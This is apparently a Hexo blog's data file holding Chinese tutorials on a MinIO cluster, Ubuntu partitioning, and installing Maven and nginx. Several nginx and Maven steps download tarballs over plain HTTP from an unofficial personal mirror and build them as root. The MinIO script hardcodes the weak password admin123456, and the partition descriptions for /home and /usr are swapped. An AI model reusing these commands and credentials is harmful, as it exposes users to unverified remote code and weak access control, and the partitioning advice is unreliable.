class=\"token keyword\">for</span> <span class=\"token builtin class-name\">help</span><span class=\"token punctuation\">)</span>:w <span class=\"token comment\"># 保存</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>格式化磁盘</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">mkfs.ext4 /dev/sdb1\nmkfs.ext4 /dev/sdb2\nmkfs.ext4 /dev/sdb3\nmkfs.ext4 /dev/sdb4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>挂载</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mount</span> /dev/sdb1 /home/minio/data/data1\n<span class=\"token function\">mount</span> /dev/sdb2 /home/minio/data/data2\n<span class=\"token function\">mount</span> /dev/sdb3 /home/minio/data/data3\n<span class=\"token function\">mount</span> /dev/sdb4 /home/minio/data/data4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><blockquote>\n<p>Minio默认9000端口，在配置文件中加入–address “:9029” 可更改端口</p>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>MINIO_ACCESS_KEY</code>: 用户名，长度最小是5个字符</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>MINIO_SECRET_KEY</code>: 密码，密码不能设置过于简单，不然minio会启动失败，长度最小是8个字符</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>--config-dir</code>: 指定集群配置文件目录</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>--address</code>: api的端口，默认是9000</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>--console-address</code>: web端口，默认随机</li>\n</ul>\n</blockquote>\n<h3 id=\"编写启动脚本\"><a href=\"#编写启动脚本\" class=\"headerlink\" title=\"编写启动脚本\"></a>编写启动脚本</h3><blockquote>\n<p><code>vim /home/minio/run/run.sh</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token shebang important\">#!/bin/bash</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">MINIO_ROOT_USER</span><span class=\"token operator\">=</span>admin\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">MINIO_ROOT_PASSWORD</span><span class=\"token operator\">=</span>admin123456\n\n<span class=\"token comment\"># 在每台机器上都执行该文件，即以分布式的方式启动了MINIO</span>\n<span class=\"token comment\"># --address \":9000\" 挂载9001端口为api端口（如Java客户端）访问的端口</span>\n<span class=\"token comment\"># --console-address \":9000\" 挂载9000端口为web端口； </span>\n/home/minio/app/minio server <span class=\"token parameter variable\">--address</span> <span class=\"token string\">\":9000\"</span> --console-address <span class=\"token string\">\":9001\"</span> --config-dir /home/minio/config <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data1 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data2 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data3 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data4 <span class=\"token punctuation\">\\</span>\n\nhttp://local-168-182-111/home/minio/data/data1 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-111/home/minio/data/data2 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-111/home/minio/data/data3 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-111/home/minio/data/data4 <span class=\"token operator\">></span> /home/minio/logs/minio_server.log<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>下面脚本复制时 \\ 后不要有空格，还有就是上面的目录是对应的一块磁盘，而非简单的在/home/minio/data目录下创建四个目录，要不然会报如下错误，看提示以为是root权限问题<code>part of root disk, will not be used (*errors.errorString)</code></p>\n</blockquote>\n<h3 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 在每台机器上都执行该文件，即以分布式的方式启动了MINIO</span>\nchomod +x /home/minio/run/run.sh\n<span class=\"token function\">sh</span> /home/minio/run/run.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>"},{"title":"ubuntu分区教程","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-05T06:05:46.000Z","password":null,"summary":"ubuntu分区教程","_content":"\n\n\n## ubuntu桌面版安装分区教程\n\n### 制作ubuntu启动盘\n\n1.去官网[`https://ubuntu.com/#download`](https://ubuntu.com/#download)下载`Ubuntu Desktop`的最新版本\n\n2.去ventoy官网[`https://www.ventoy.net/cn/download.html`](https://www.ventoy.net/cn/download.html)下载启动盘制作工具\n\n3.下载好ventoy之后，插上U盘，解压ventoy，双击Ventoy2Disk.ext将U盘制作程启动盘\n\n4.将第一步下载好的ISO镜像文件复制到制作好的U盘中\n\n5.重启系统，狂按你电脑进入Boot Manager的按键，不同品牌的按键有所不同\n\n6.选择你的U盘，再选择你要安装的系统\n\n\n\n### 分区\n\n> efi 逻辑分区 512MB-1024MB\n\n```text\n因为是u盘的uefi启动，因此设置一个efi引导\n```\n\n\n\n> swap 主分区 交换空间 大小为物理内存的1.5倍左右\n\n```text\n如果物理内存在8G以下，则swap设置为物理内存一样的大小，如果超过8G，则一般设置为8G大小的虚拟内存就足够了。根据自身的使用需求，也可以适当增大swap大小\n```\n\n\n\n> / 逻辑分区 随便分\n\n```text\n主要用来存放ubuntu系统文件。有固态硬盘的可以安在固态盘中\n```\n\n\n\n>  /home 逻辑分区 随便分\n\n```text\n存用户程序，一般在/usr/bin中存放发行版提供的程序，用户自行安装的程序默认安装到/usr/local/bin\n```\n\n\n\n> /usr 逻辑分区 随便分\n\n```text\n存放用户文件。这个分区尽量设置大一些，因为我安装了机械盘，因此分配了300g的存储空间给它\n```\n\n","source":"_posts/ubuntu分区教程.md","raw":"---\ntitle: ubuntu分区教程\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-05 14:05:46\npassword:\nsummary: ubuntu分区教程\ntags: os\ncategories: ubuntu\n---\n\n\n\n## ubuntu桌面版安装分区教程\n\n### 制作ubuntu启动盘\n\n1.去官网[`https://ubuntu.com/#download`](https://ubuntu.com/#download)下载`Ubuntu Desktop`的最新版本\n\n2.去ventoy官网[`https://www.ventoy.net/cn/download.html`](https://www.ventoy.net/cn/download.html)下载启动盘制作工具\n\n3.下载好ventoy之后，插上U盘，解压ventoy，双击Ventoy2Disk.ext将U盘制作程启动盘\n\n4.将第一步下载好的ISO镜像文件复制到制作好的U盘中\n\n5.重启系统，狂按你电脑进入Boot Manager的按键，不同品牌的按键有所不同\n\n6.选择你的U盘，再选择你要安装的系统\n\n\n\n### 分区\n\n> efi 逻辑分区 512MB-1024MB\n\n```text\n因为是u盘的uefi启动，因此设置一个efi引导\n```\n\n\n\n> swap 主分区 交换空间 大小为物理内存的1.5倍左右\n\n```text\n如果物理内存在8G以下，则swap设置为物理内存一样的大小，如果超过8G，则一般设置为8G大小的虚拟内存就足够了。根据自身的使用需求，也可以适当增大swap大小\n```\n\n\n\n> / 逻辑分区 随便分\n\n```text\n主要用来存放ubuntu系统文件。有固态硬盘的可以安在固态盘中\n```\n\n\n\n>  /home 逻辑分区 随便分\n\n```text\n存用户程序，一般在/usr/bin中存放发行版提供的程序，用户自行安装的程序默认安装到/usr/local/bin\n```\n\n\n\n> /usr 逻辑分区 随便分\n\n```text\n存放用户文件。这个分区尽量设置大一些，因为我安装了机械盘，因此分配了300g的存储空间给它\n```\n\n","slug":"ubuntu分区教程","published":1,"updated":"2023-05-09T22:32:49.945Z","_id":"clha679o80000ngr66uoof03c","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"ubuntu桌面版安装分区教程\"><a href=\"#ubuntu桌面版安装分区教程\" class=\"headerlink\" title=\"ubuntu桌面版安装分区教程\"></a>ubuntu桌面版安装分区教程</h2><h3 id=\"制作ubuntu启动盘\"><a href=\"#制作ubuntu启动盘\" class=\"headerlink\" title=\"制作ubuntu启动盘\"></a>制作ubuntu启动盘</h3><p>1.去官网<a href=\"https://ubuntu.com/#download\"><code>https://ubuntu.com/#download</code></a>下载<code>Ubuntu Desktop</code>的最新版本</p>\n<p>2.去ventoy官网<a href=\"https://www.ventoy.net/cn/download.html\"><code>https://www.ventoy.net/cn/download.html</code></a>下载启动盘制作工具</p>\n<p>3.下载好ventoy之后，插上U盘，解压ventoy，双击Ventoy2Disk.ext将U盘制作程启动盘</p>\n<p>4.将第一步下载好的ISO镜像文件复制到制作好的U盘中</p>\n<p>5.重启系统，狂按你电脑进入Boot Manager的按键，不同品牌的按键有所不同</p>\n<p>6.选择你的U盘，再选择你要安装的系统</p>\n<h3 id=\"分区\"><a href=\"#分区\" class=\"headerlink\" title=\"分区\"></a>分区</h3><blockquote>\n<p>efi 逻辑分区 512MB-1024MB</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">因为是u盘的uefi启动，因此设置一个efi引导<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p>swap 主分区 交换空间 大小为物理内存的1.5倍左右</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">如果物理内存在8G以下，则swap设置为物理内存一样的大小，如果超过8G，则一般设置为8G大小的虚拟内存就足够了。根据自身的使用需求，也可以适当增大swap大小<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p>/ 逻辑分区 随便分</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">主要用来存放ubuntu系统文件。有固态硬盘的可以安在固态盘中<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p> /home 逻辑分区 随便分</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">存用户程序，一般在/usr/bin中存放发行版提供的程序，用户自行安装的程序默认安装到/usr/local/bin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p>/usr 逻辑分区 随便分</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">存放用户文件。这个分区尽量设置大一些，因为我安装了机械盘，因此分配了300g的存储空间给它<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"ubuntu桌面版安装分区教程\"><a href=\"#ubuntu桌面版安装分区教程\" class=\"headerlink\" title=\"ubuntu桌面版安装分区教程\"></a>ubuntu桌面版安装分区教程</h2><h3 id=\"制作ubuntu启动盘\"><a href=\"#制作ubuntu启动盘\" class=\"headerlink\" title=\"制作ubuntu启动盘\"></a>制作ubuntu启动盘</h3><p>1.去官网<a href=\"https://ubuntu.com/#download\"><code>https://ubuntu.com/#download</code></a>下载<code>Ubuntu Desktop</code>的最新版本</p>\n<p>2.去ventoy官网<a href=\"https://www.ventoy.net/cn/download.html\"><code>https://www.ventoy.net/cn/download.html</code></a>下载启动盘制作工具</p>\n<p>3.下载好ventoy之后，插上U盘，解压ventoy，双击Ventoy2Disk.ext将U盘制作程启动盘</p>\n<p>4.将第一步下载好的ISO镜像文件复制到制作好的U盘中</p>\n<p>5.重启系统，狂按你电脑进入Boot Manager的按键，不同品牌的按键有所不同</p>\n<p>6.选择你的U盘，再选择你要安装的系统</p>\n<h3 id=\"分区\"><a href=\"#分区\" class=\"headerlink\" title=\"分区\"></a>分区</h3><blockquote>\n<p>efi 逻辑分区 512MB-1024MB</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">因为是u盘的uefi启动，因此设置一个efi引导<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p>swap 主分区 交换空间 大小为物理内存的1.5倍左右</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">如果物理内存在8G以下，则swap设置为物理内存一样的大小，如果超过8G，则一般设置为8G大小的虚拟内存就足够了。根据自身的使用需求，也可以适当增大swap大小<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p>/ 逻辑分区 随便分</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">主要用来存放ubuntu系统文件。有固态硬盘的可以安在固态盘中<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p> /home 逻辑分区 随便分</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">存用户程序，一般在/usr/bin中存放发行版提供的程序，用户自行安装的程序默认安装到/usr/local/bin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<blockquote>\n<p>/usr 逻辑分区 随便分</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">存放用户文件。这个分区尽量设置大一些，因为我安装了机械盘，因此分配了300g的存储空间给它<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n"},{"title":"Linux安装maven","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-09T22:40:09.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Linux Install Maven","_content":"\n## Linux Install Maven\n\n> 获取maven\n\n```shell\n# 官方\nwget https://dlcdn.apache.org/maven/maven-3/3.9.1/binaries/apache-maven-3.9.1-bin.tar.gz\n# 或者\nwget http://nobibibi.top/somg/file/maven/apache-maven-linux-3.9.1-bin.tar.gz\n```\n\n> 解压到`/usr/local/mvn/`\n\n```shell\nmkdir /usr/local/mvn && tar -zxvf apache-maven-3.9.1-bin.tar.gz -C /usr/local/mvn/\n```\n\n> 配置环境变量\n\n```shell\nexport PATH=$PATH:/usr/local/mvn/apache-maven-3.9.1/bin\n```","source":"_posts/Linux安装maven.md","raw":"---\ntitle: Linux安装maven\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-10 06:40:09\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Linux Install Maven\ntags: maven\ncategories: Linux\n---\n\n## Linux Install Maven\n\n> 获取maven\n\n```shell\n# 官方\nwget https://dlcdn.apache.org/maven/maven-3/3.9.1/binaries/apache-maven-3.9.1-bin.tar.gz\n# 或者\nwget http://nobibibi.top/somg/file/maven/apache-maven-linux-3.9.1-bin.tar.gz\n```\n\n> 解压到`/usr/local/mvn/`\n\n```shell\nmkdir /usr/local/mvn && tar -zxvf apache-maven-3.9.1-bin.tar.gz -C /usr/local/mvn/\n```\n\n> 配置环境变量\n\n```shell\nexport PATH=$PATH:/usr/local/mvn/apache-maven-3.9.1/bin\n```","slug":"Linux安装maven","published":1,"updated":"2023-05-19T05:50:50.143Z","_id":"clhgy9svv00000gvg4i1112pj","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Linux-Install-Maven\"><a href=\"#Linux-Install-Maven\" class=\"headerlink\" title=\"Linux Install Maven\"></a>Linux Install Maven</h2><blockquote>\n<p>获取maven</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 官方</span>\n<span class=\"token function\">wget</span> https://dlcdn.apache.org/maven/maven-3/3.9.1/binaries/apache-maven-3.9.1-bin.tar.gz\n<span class=\"token comment\"># 或者</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/maven/apache-maven-linux-3.9.1-bin.tar.gz<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>解压到<code>/usr/local/mvn/</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/mvn <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> apache-maven-3.9.1-bin.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/mvn/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>配置环境变量</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span>:/usr/local/mvn/apache-maven-3.9.1/bin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux-Install-Maven\"><a href=\"#Linux-Install-Maven\" class=\"headerlink\" title=\"Linux Install Maven\"></a>Linux Install Maven</h2><blockquote>\n<p>获取maven</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 官方</span>\n<span class=\"token function\">wget</span> https://dlcdn.apache.org/maven/maven-3/3.9.1/binaries/apache-maven-3.9.1-bin.tar.gz\n<span class=\"token comment\"># 或者</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/maven/apache-maven-linux-3.9.1-bin.tar.gz<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>解压到<code>/usr/local/mvn/</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/mvn <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> apache-maven-3.9.1-bin.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/mvn/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>配置环境变量</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span>:/usr/local/mvn/apache-maven-3.9.1/bin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>"},{"title":"Linux安装nginx","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-09T22:44:53.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Linux Install Nginx","_content":"## Linux Install Nginx\n\n### 安装之前\n\n> 安装编译工具\n\n```shell\nyum install -y gcc-c++\n```\n\n> 创建nginx安装目录\n\n```shell\nmkdir /usr/local/nginx # nginx安装到这里\nmkdir /usr/local/nginx/package # 需要的依赖包放在这里 如果要全编译安装的话就需要这个文件夹\nmkdir /home/nginxInstallPackage # 创建nginx安装包或者依赖包目录\n```\n### 下载相关依赖\n> 全编译安装下载依赖\n```shell\ncd /home/nginxInstallPackage\n# 下载openssl 支持nginx开通https的模块 非对称加密的工具(https://www.openssl.org/) 选择性下载\nwget http://nobibibi.top/somg/file/nginx/linux/openssl-1.1.1l.tar.gz && tar -zxvf openssl-1.1.1l.tar.gz -C /usr/local/nginx/package/\n# 下载zlib 是一款支持zlib压缩的模块(zlib.net) 必须下载\nwget http://nobibibi.top/somg/file/nginx/linux/zlib-1.2.11.tar.gz && tar -zxvf zlib-1.2.11.tar.gz  -C /usr/local/nginx/package/\n# 下载pcre 是一个支持正则表达式的模块(www.pcre.org) 必须下载\nwget http://nobibibi.top/somg/file/nginx/linux/pcre-8.42.tar.gz && tar -zxvf pcre-8.42.tar.gz  -C /usr/local/nginx/package/\n```\n> 命令安装依赖\n```shell\nyum -y install pcre pcre-devel zlib openssl openssl-devel\n```\n\n### 安装Nginx\n\n#### 全编译安装\n\n> 下载nginx\n\n```shell\ncd /home/nginxInstallPackage\n\nwget http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz && tar -zxvf nginx-1.20.2.tar.gz -C /usr/local/nginx/package/ # 下载nginx\n```\n\n> 执行`configure`\n\n```shell\ncd /usr/local/nginx/package/nginx-1.20.2\n\n./configure --prefix=/usr/local/nginx \\\n\t--with-http_ssl_module --with-openssl=../openssl-1.1.1l \\\n    --with-pcre=../pcre-8.42 \\\n    --with-zlib=../zlib-1.2.11 # 执行\n```\n\n> 编译并安装nginx\n\n```shell\nmake && make install\n```\n\n#### 命令安装依赖方式编译安装\n> 下载nginx\n\n```shell\ncd /home/nginxInstallPackage\n\nwget http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz && tar -zxvf nginx-1.20.2.tar.gz -C /usr/local/nginx/package/ # 下载nginx\n```\n\n> 执行`configure`\n\n```shell\ncd /usr/local/nginx/package/nginx-1.20.2\n\n./configure --prefix=/usr/local/nginx # 执行\n```\n\n> 编译并安装nginx\n\n```shell\nmake && make install\n```\n\n### nginx结构\n安装后所有的文件都在`/usr/local/nginx`下面\n\n> `sbin`存放nginx命令\n\n```shell\ncd sbin\n\n./nginx # 启动 \n\n./nginx -s reload # 重启\n\n./nginx -s stop # 关闭 \n\npkill -9 nginx # 强制关闭\n```\n\n> `conf`\n\n```shell\ncat nginx.conf # nginx默认配置\n```\n\n> `html`是静态文件目录\n\n\n### 其他安装方式\n\n#### 通过命令行安装\n```shell\napt install nginx \n/etc/init.d/nginx start # 启动 \n/etc/init.d/nginx stop # 停止 \n/etc/init.d/nginx restart # 重启\n```\n\n#### 通过docker安装\n\n> 获取镜像\n\n```shelll\ndocker pull nginx\n```\n\n> 运行镜像\n\n```shell\ndocker run -itd -p 80:80 --name nginx --restart always nginx\n```\n\n> 进入容器执行命令\n\n```shell\ndocker exec -it nginx /bin/bash -c \"一个或者多个命令\" # 不进入容器执行命令\n\ndocker exec -it nginx /bin/bash # 进入容器执行命令\n```\n\n> 复制\n\n```shell\ndocker cp /home/default.conf nginx:/etc/nginx/conf.d/ # 将宿主机的文件复制到容器内\ndocker cp nginx:/etc/nginx/conf.d/default.conf /home/ # 将容器中的文件复制到宿主机\n```\n\n> 容器管理\n\n```\ndocker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启\n```\n\n> 修改容器配置\n\n```shell\ndocker container update --restart=always nginx\ndocker restart nginx # 重启\n```\n","source":"_posts/Linux安装nginx.md","raw":"---\ntitle: Linux安装nginx\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-10 06:44:53\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Linux Install Nginx\ntags: nginx\ncategories: Linux\n---\n## Linux Install Nginx\n\n### 安装之前\n\n> 安装编译工具\n\n```shell\nyum install -y gcc-c++\n```\n\n> 创建nginx安装目录\n\n```shell\nmkdir /usr/local/nginx # nginx安装到这里\nmkdir /usr/local/nginx/package # 需要的依赖包放在这里 如果要全编译安装的话就需要这个文件夹\nmkdir /home/nginxInstallPackage # 创建nginx安装包或者依赖包目录\n```\n### 下载相关依赖\n> 全编译安装下载依赖\n```shell\ncd /home/nginxInstallPackage\n# 下载openssl 支持nginx开通https的模块 非对称加密的工具(https://www.openssl.org/) 选择性下载\nwget http://nobibibi.top/somg/file/nginx/linux/openssl-1.1.1l.tar.gz && tar -zxvf openssl-1.1.1l.tar.gz -C /usr/local/nginx/package/\n# 下载zlib 是一款支持zlib压缩的模块(zlib.net) 必须下载\nwget http://nobibibi.top/somg/file/nginx/linux/zlib-1.2.11.tar.gz && tar -zxvf zlib-1.2.11.tar.gz  -C /usr/local/nginx/package/\n# 下载pcre 是一个支持正则表达式的模块(www.pcre.org) 必须下载\nwget http://nobibibi.top/somg/file/nginx/linux/pcre-8.42.tar.gz && tar -zxvf pcre-8.42.tar.gz  -C /usr/local/nginx/package/\n```\n> 命令安装依赖\n```shell\nyum -y install pcre pcre-devel zlib openssl openssl-devel\n```\n\n### 安装Nginx\n\n#### 全编译安装\n\n> 下载nginx\n\n```shell\ncd /home/nginxInstallPackage\n\nwget http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz && tar -zxvf nginx-1.20.2.tar.gz -C /usr/local/nginx/package/ # 下载nginx\n```\n\n> 执行`configure`\n\n```shell\ncd /usr/local/nginx/package/nginx-1.20.2\n\n./configure --prefix=/usr/local/nginx \\\n\t--with-http_ssl_module --with-openssl=../openssl-1.1.1l \\\n    --with-pcre=../pcre-8.42 \\\n    --with-zlib=../zlib-1.2.11 # 执行\n```\n\n> 编译并安装nginx\n\n```shell\nmake && make install\n```\n\n#### 命令安装依赖方式编译安装\n> 下载nginx\n\n```shell\ncd /home/nginxInstallPackage\n\nwget http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz && tar -zxvf nginx-1.20.2.tar.gz -C /usr/local/nginx/package/ # 下载nginx\n```\n\n> 执行`configure`\n\n```shell\ncd /usr/local/nginx/package/nginx-1.20.2\n\n./configure --prefix=/usr/local/nginx # 执行\n```\n\n> 编译并安装nginx\n\n```shell\nmake && make install\n```\n\n### nginx结构\n安装后所有的文件都在`/usr/local/nginx`下面\n\n> `sbin`存放nginx命令\n\n```shell\ncd sbin\n\n./nginx # 启动 \n\n./nginx -s reload # 重启\n\n./nginx -s stop # 关闭 \n\npkill -9 nginx # 强制关闭\n```\n\n> `conf`\n\n```shell\ncat nginx.conf # nginx默认配置\n```\n\n> `html`是静态文件目录\n\n\n### 其他安装方式\n\n#### 通过命令行安装\n```shell\napt install nginx \n/etc/init.d/nginx start # 启动 \n/etc/init.d/nginx stop # 停止 \n/etc/init.d/nginx restart # 重启\n```\n\n#### 通过docker安装\n\n> 获取镜像\n\n```shelll\ndocker pull nginx\n```\n\n> 运行镜像\n\n```shell\ndocker run -itd -p 80:80 --name nginx --restart always nginx\n```\n\n> 进入容器执行命令\n\n```shell\ndocker exec -it nginx /bin/bash -c \"一个或者多个命令\" # 不进入容器执行命令\n\ndocker exec -it nginx /bin/bash # 进入容器执行命令\n```\n\n> 复制\n\n```shell\ndocker cp /home/default.conf nginx:/etc/nginx/conf.d/ # 将宿主机的文件复制到容器内\ndocker cp nginx:/etc/nginx/conf.d/default.conf /home/ # 将容器中的文件复制到宿主机\n```\n\n> 容器管理\n\n```\ndocker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启\n```\n\n> 修改容器配置\n\n```shell\ndocker container update --restart=always nginx\ndocker restart nginx # 重启\n```\n","slug":"Linux安装nginx","published":1,"updated":"2023-05-19T05:52:48.886Z","_id":"clhgy9swa00020gvgg03e96c0","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Linux-Install-Nginx\"><a href=\"#Linux-Install-Nginx\" class=\"headerlink\" title=\"Linux Install Nginx\"></a>Linux Install Nginx</h2><h3 id=\"安装之前\"><a href=\"#安装之前\" class=\"headerlink\" title=\"安装之前\"></a>安装之前</h3><blockquote>\n<p>安装编译工具</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> gcc-c++<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>创建nginx安装目录</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/nginx <span class=\"token comment\"># nginx安装到这里</span>\n<span class=\"token function\">mkdir</span> /usr/local/nginx/package <span class=\"token comment\"># 需要的依赖包放在这里 如果要全编译安装的话就需要这个文件夹</span>\n<span class=\"token function\">mkdir</span> /home/nginxInstallPackage <span class=\"token comment\"># 创建nginx安装包或者依赖包目录</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"下载相关依赖\"><a href=\"#下载相关依赖\" class=\"headerlink\" title=\"下载相关依赖\"></a>下载相关依赖</h3><blockquote>\n<p>全编译安装下载依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/nginxInstallPackage\n<span class=\"token comment\"># 下载openssl 支持nginx开通https的模块 非对称加密的工具(https://www.openssl.org/) 选择性下载</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/openssl-1.1.1l.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> openssl-1.1.1l.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/\n<span class=\"token comment\"># 下载zlib 是一款支持zlib压缩的模块(zlib.net) 必须下载</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/zlib-1.2.11.tar.gz <span 